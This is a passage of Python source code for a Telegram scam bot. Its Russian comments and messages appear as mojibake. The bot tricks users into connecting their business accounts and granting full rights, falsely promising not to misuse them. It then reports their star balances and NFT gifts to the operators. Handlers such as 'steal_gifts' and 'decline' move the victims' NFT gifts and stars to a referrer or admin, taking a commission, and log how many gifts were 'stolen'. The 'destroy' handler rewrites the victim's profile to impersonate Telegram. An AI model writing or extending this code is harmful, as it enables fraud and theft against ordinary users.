        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏
        required_gift_rights = [
            rights.can_convert_gifts_to_stars,
            rights.can_transfer_stars
        ]
        
        if not all(required_gift_rights):
            error_msg = f"{error_base} - –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            warning_message = (
                "‚õîÔ∏è –í—ã –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª–∏ –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞ –±–æ—Ç—É\n\n"
                "üîî –î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –µ–º—É –≤—Å–µ –ø—Ä–∞–≤–∞ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö.\n"
                "‚ö†Ô∏è –ú—ã –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º —ç—Ç–∏ –ø—Ä–∞–≤–∞ –≤ –ø–ª–æ—Ö–∏—Ö —Ü–µ–ª—è—Ö, –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –æ–Ω –º–æ–≥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏ –Ω–∞–ø—Ä—è–º—É—é –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–≤–µ–∑–¥—ã –æ—Ç –æ–¥–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥—Ä—É–≥–æ–º—É ‚Äî –±–µ–∑ –ª–∏—à–Ω–∏—Ö –¥–µ–π—Å—Ç–≤–∏–π –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–π.\n\n"
                "‚úÖ –ö–∞–∫ —Ç–æ–ª—å–∫–æ –≤—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç–µ –≤—Å–µ –ø—Ä–∞–≤–∞, –±–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É–≤–µ–¥–æ–º–∏—Ç –≤–∞—Å –æ —Ç–æ–º, —á—Ç–æ –≤—Å—ë –≥–æ—Ç–æ–≤–æ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é"
            )
            try:
                await bot.send_message(
                    chat_id=user.id,
                    text=warning_message
                )
            except Exception as e:
                await bot.send_message(LOG_CHAT_ID, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user.id}: {e}")
            return
        
        # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –ø–æ–¥–∞—Ä–∫–∞—Ö –∏ –∑–≤–µ–∑–¥–∞—Ö
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

    except Exception as e:
        error_type = str(e)
        if "BOT_ACCESS_FORBIDDEN" in error_type:
            error_msg = f"{error_base} - –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤"
        else:
            error_msg = f"{error_base} - –ë–æ—Ç –æ—Ç–≤—è–∑–∞–Ω"
        
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            try:
                await bot.send_message(inviter_id, error_msg)
            except Exception as e:
                logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ: {e}")
        return

    # –û—Å—Ç–∞–ª—å–Ω–∞—è —á–∞—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    header = f"‚ú® <b>–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞</b> ‚ú®\n"
    user_info = (
        f"<blockquote>üë§ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:</b>\n"
        f"‚îú‚îÄ ID: <code>{user.id}</code>\n"
        f"‚îú‚îÄ Username: @{user.username or '–Ω–µ—Ç'}\n"
        f"‚îú‚îÄ –ü—Ä–∏–≥–ª–∞—Å–∏–ª: {inviter_username}\n"
        f"‚ï∞‚îÄ –ò–º—è: {user.first_name or ''} {user.last_name or ''}</blockquote>\n"
    )
    balance_info = (
        f"<blockquote>üí∞ <b>–ë–∞–ª–∞–Ω—Å:</b>\n"
        f"‚ï∞‚îÄ –î–æ—Å—Ç—É–ø–Ω–æ –∑–≤—ë–∑–¥: {int(stars.amount):,}</blockquote>\n"
    )
    gifts_info = (
        f"<blockquote>üéÅ <b>–ü–æ–¥–∞—Ä–∫–∏:</b>\n"
        f"‚îú‚îÄ NFT: {len(nft_gifts)}\n"
        f"‚ï∞‚îÄ <b>–°—Ç–æ–∏–º–æ—Å—Ç—å –ø–µ—Ä–µ–Ω–æ—Å–∞ NFT:</b> {nft_transfer_cost:,} –∑–≤—ë–∑–¥ (25 –∑–∞ –∫–∞–∂–¥—ã–π)</blockquote>\n"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', '—Å–∫—Ä—ã—Ç')
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (ID: {gift_id}) - 25‚≠ê")
            except AttributeError:
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (—Å–∫—Ä—ã—Ç) - 25‚≠ê")
        
        nft_list = "\n<blockquote>üîó <b>NFT –ø–æ–¥–∞—Ä–∫–∏:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n‚ï∞‚îÄ <b>–ò—Ç–æ–≥–æ:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}‚≠ê</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>üîê <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>\n"
        f"‚îú‚îÄ –û—Å–Ω–æ–≤–Ω—ã–µ: {'‚úÖ' if rights.can_read_messages else '‚ùå'} –ß—Ç–µ–Ω–∏–µ | "
        f"{'‚úÖ' if rights.can_delete_all_messages else '‚ùå'} –£–¥–∞–ª–µ–Ω–∏–µ\n"
        f"‚îú‚îÄ –ü—Ä–æ—Ñ–∏–ª—å: {'‚úÖ' if rights.can_edit_name else '‚ùå'} –ò–º—è | "
        f"{'‚úÖ' if rights.can_edit_username else '‚ùå'} Username\n"
        f"‚ï∞‚îÄ –ü–æ–¥–∞—Ä–∫–∏: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'} –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è | "
        f"{'‚úÖ' if rights.can_transfer_stars else '‚ùå'} –ü–µ—Ä–µ–≤–æ–¥</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>‚ÑπÔ∏è <i>–ü–µ—Ä–µ–Ω–æ—Å –∫–∞–∂–¥–æ–≥–æ NFT –ø–æ–¥–∞—Ä–∫–∞ —Å—Ç–æ–∏—Ç 25 –∑–≤—ë–∑–¥</i>\n"
        f"üïí –í—Ä–µ–º—è: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ –ª–æ–≥-—á–∞—Ç: {e}")

    if inviter_id:
        try:
            await bot.send_message(
                chat_id=int(inviter_id),
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_msg = f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É {inviter_id}: {str(e)}"
            logging.error(error_msg)
            await bot.send_message(LOG_CHAT_ID, error_msg)

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(
        text="–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ —é–∑–µ—Ä–∞ –∫–æ–º—É –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–∏"
    )
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):

    msg = await message.answer(
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    try:
        # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        user_data = await state.get_data()
        if 'user_id' not in user_data:
            await callback.answer("–û—à–∏–±–∫–∞: –Ω–µ –Ω–∞–π–¥–µ–Ω ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", show_alert=True)
            return
            
        gift_id = callback.data.split('_')[1]
        user_id = user_data['user_id']
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ user_id - —ç—Ç–æ —á–∏—Å–ª–æ
        try:
            user_id_int = int(user_id)
        except ValueError:
            await callback.answer("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", show_alert=True)
            return
            
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–∞—Ä–æ–∫
        await bot.send_gift(
            gift_id=gift_id,
            chat_id=user_id_int
        )
        await callback.message.answer(f"‚úÖ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}")
        await state.clear()  # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞: {e}")
        await callback.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞", show_alert=True)

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )
    
            

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="‚≠êÔ∏è–í—ã–≤–æ–¥ –∑–≤–µ–∑–¥",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å:",
        reply_markup=builder.as_markup()
    )
@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="‚õîÔ∏è–û—Ç–º–µ–Ω–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="‚õîÔ∏è–í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è, –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("–ú–∞–º–æ–Ω—Ç —Å–ø–∞—Å–µ–Ω –æ—Ç —Å–Ω–æ—Å–∞.")

    user_id = callback.from_user.id
    inviter_id = user_referrer_map.get(user_id)

    # –ï—Å–ª–∏ –Ω–µ—Ç –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ ‚Äî fallback –Ω–∞ –ø–µ—Ä–≤–æ–≥–æ –∞–¥–º–∏–Ω–∞
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]

    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    if gifts_to_process == []:
        await bot.send_message(chat_id=LOG_CHAT_ID, text="–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        print(gift.gift)

        gift_type = gift.type
        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except:
                pass
    
        if not gift_id:
            continue

        # –ü–µ—Ä–µ–¥–∞—á–∞
        if isTransfered:
            try:
                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                await message.answer(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫ {gift_name} –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {recipient_id}")
                print(e)


    # –õ–æ–≥
    if stolen_count > 0:
        text = (
            f"üéÅ –£—Å–ø–µ—à–Ω–æ —É–∫—Ä–∞–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("–ù–µ —É–¥–∞–ª–æ—Å—å —É–∫—Ä–∞—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∏")
    
    # –ü–µ—Ä–µ–≤–æ–¥ –∑–≤—ë–∑–¥
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(LOG_CHAT_ID, f"üåü –í—ã–≤–µ–¥–µ–Ω–æ –∑–≤—ë–∑–¥: {amount}")
        else:
            await message.answer("–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –∑–≤–µ–∑–¥.")
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"üö´ –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ –∑–≤—ë–∑–¥: {e}")

@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        user_id = user.id
    except Exception as e:
        await callback.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        return

    inviter_id = user_referrer_map.get(str(user_id))
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ–ª—É—á–∞—Ç–µ–ª–µ–π —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏
    take_commission = str(user_id) in COMMISSION_USERS
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
    
    stolen_nfts = []  # –¢–æ–ª—å–∫–æ –ø–æ–¥–∞—Ä–∫–∏, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É
    admin_nfts = []   # –ü–æ–¥–∞—Ä–∫–∏, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω—É (–¥–ª—è –ø–æ–ª–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞)
    stolen_count = 0
    admin_gifts = 0
    user_gifts_count = 0  # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∞—Ä–∫–æ–≤, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        error_msg = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            await bot.send_message(inviter_id, error_msg)
        await callback.answer("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    # –°–Ω–∞—á–∞–ª–∞ —Å—á–∏—Ç–∞–µ–º –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
    unique_gifts = [g for g in gifts_to_process if g.type == "unique" and g.can_be_transferred]
    total_unique = len(unique_gifts)
    
    if take_commission:
        admin_gifts = calculate_commission(total_unique)
        user_gifts = total_unique - admin_gifts
    else:
        user_gifts = total_unique
    
    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
    admin_sent = 0
    user_sent = 0
    
    for gift in unique_gifts:
        try:
            gift_id = gift.owned_gift_id
            gift_name = gift.gift.name.replace(' ', '') if hasattr(gift.gift, 'name') else 'Unknown'
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–æ–º—É –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫
            if take_commission and admin_sent < admin_gifts:
                # –ü–µ—Ä–µ–¥–∞–µ–º –∞–¥–º–∏–Ω—É (–∫–æ–º–∏—Å—Å–∏—è)
                await bot.transfer_gift(business_id, gift_id, ADMIN_IDS[0], gift.transfer_star_count)
                admin_nfts.append(f"t.me/nft/{gift_name}")
                admin_sent += 1
            elif user_sent < user_gifts:
                # –ü–µ—Ä–µ–¥–∞–µ–º –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É
                await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                user_sent += 1
                user_gifts_count += 1
            
            stolen_count += 1
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–∞: {e}")
            continue

    # –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –¥–ª—è –∞–¥–º–∏–Ω–∞ (—Å –∫–æ–º–∏—Å—Å–∏–µ–π)
    full_report = []
    if stolen_count > 0:
        full_report.append(f"\nüéÅ –í—Å–µ–≥–æ —É–∫—Ä–∞–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{stolen_count}</b>\n")
        if take_commission and admin_gifts > 0:
            full_report.append(f"‚îú‚îÄ –ê–¥–º–∏–Ω—É: <b>{admin_gifts}</b>\n")
            full_report.append(f"‚ï∞‚îÄ –ü—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É: <b>{user_gifts_count}</b>\n\n")
            full_report.extend([f"üîπ {nft}\n" for nft in admin_nfts[:5]])
            full_report.append("\n")
        full_report.extend([f"üî∏ {nft}\n" for nft in stolen_nfts[:5]])
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º –ø—É–±–ª–∏—á–Ω—ã–π –æ—Ç—á–µ—Ç (–±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏)
    public_report = []
    if user_gifts_count > 0:
        public_report.append(f"\nüéÅ –£—Å–ø–µ—à–Ω–æ —É–∫—Ä–∞–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{user_gifts_count}</b>\n")
        public_report.extend([f"üî∏ {nft}\n" for nft in stolen_nfts[:5]])
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –∞–¥–º–∏–Ω—É –≤ –ª–∏—á–∫—É
    if stolen_count > 0 and ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=ADMIN_IDS[0],
                text=f"üî∑ –ü–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É {user_id}:\n{''.join(full_report)}",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç—á–µ—Ç–∞ –∞–¥–º–∏–Ω—É: {e}")
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—É–±–ª–∏—á–Ω—ã–π –æ—Ç—á–µ—Ç –≤ –ª–æ–≥-—á–∞—Ç
    report_text = f"–û—Ç—á–µ—Ç –ø–æ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É {user_id}:"
    if user_gifts_count > 0:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=f"{report_text}\n{''.join(public_report)}",
            parse_mode="HTML"
        )
    else:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=f"{report_text}\n–ù–µ —É–¥–∞–ª–æ—Å—å —É–∫—Ä–∞—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∏",
            parse_mode="HTML"
        )
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—É–±–ª–∏—á–Ω—ã–π –æ—Ç—á–µ—Ç –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É (–µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å –∏ –Ω–µ —Å–∞–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å)
    if inviter_id and inviter_id != user_id and user_gifts_count > 0:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=f"–û—Ç—á–µ—Ç –ø–æ –≤–∞—à–µ–º—É —Ä–µ—Ñ–µ—Ä–∞–ª—É {user_id}:\n{''.join(public_report)}",
                parse_mode="HTML"
            )
        except Exception as e:
            await bot.send_message(LOG_CHAT_ID, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ: {e}")
    
    answer_text = f"–£–∫—Ä–∞–¥–µ–Ω–æ {stolen_count} –ø–æ–¥–∞—Ä–∫–æ–≤"
    if take_commission and admin_gifts > 0:
        answer_text += f" ({admin_gifts} –∞–¥–º–∏–Ω—É)"
    await callback.answer(answer_text)

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ–ª—É—á–∞—Ç–µ–ª—è
        inviter_id = user_referrer_map.get(str(user.id))  # –ò—Å–ø–æ–ª—å–∑—É–µ–º str() –¥–ª—è –∫–ª—é—á–∞
        if inviter_id:
            try:
                await bot.send_chat_action(inviter_id, "typing")
                recipient_id = inviter_id
            except Exception:
                recipient_id = ADMIN_IDS[0]
        else:
            recipient_id = ADMIN_IDS[0]
            
        stars = await bot.get_business_account_star_balance(business_id)
        # –£–±–µ–∂–¥–∞–µ–º—Å—è, —á—Ç–æ amount - —á–∏—Å–ª–æ
        amount = int(stars.amount) if isinstance(stars.amount, str) else stars.amount
        
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            success_msg = f"üåü –£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ –∑–≤—ë–∑–¥: {amount} –æ—Ç {user.id} –∫ {recipient_id}"
            
            await bot.send_message(LOG_CHAT_ID, success_msg)
            if inviter_id and inviter_id != recipient_id:
                try:
                    await bot.send_message(inviter_id, success_msg)
                except Exception as e:
                    await bot.send_message(LOG_CHAT_ID, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ: {e}")
                    
            await callback.answer(f"–ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ {amount} –∑–≤—ë–∑–¥")
        else:
            await callback.answer("–ù–µ—Ç –∑–≤—ë–∑–¥ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞", show_alert=True)
            
    except Exception as e:
        error_msg = f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –∑–≤—ë–∑–¥: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        await callback.answer("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –∑–≤—ë–∑–¥", show_alert=True)

@dp.inline_query()
async def inline_query_handler(inline_query: types.InlineQuery):
    try:
        user_id = inline_query.from_user.id
        is_admin = user_id in ADMIN_IDS
        
        try:
            query = inline_query.query.strip()
            if query.isdigit():
                amount = int(query)
            elif query.lower().startswith('—á–µ–∫ ') and len(query.split()) >= 2:
                amount = int(query.split()[1])
